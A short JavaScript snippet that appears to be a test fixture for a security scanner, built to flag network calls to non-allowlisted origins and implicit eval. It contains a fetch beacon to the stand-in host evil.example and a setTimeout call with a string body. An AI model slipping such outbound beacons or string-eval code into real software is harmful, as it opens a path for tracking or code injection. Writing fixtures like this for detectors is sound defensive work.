// Straightforward off-package egress to a non-allowlisted origin (static URL),
// plus a setTimeout string body (implicit eval).
fetch('https://evil.example/beacon');
setTimeout("doWork()", 1000);
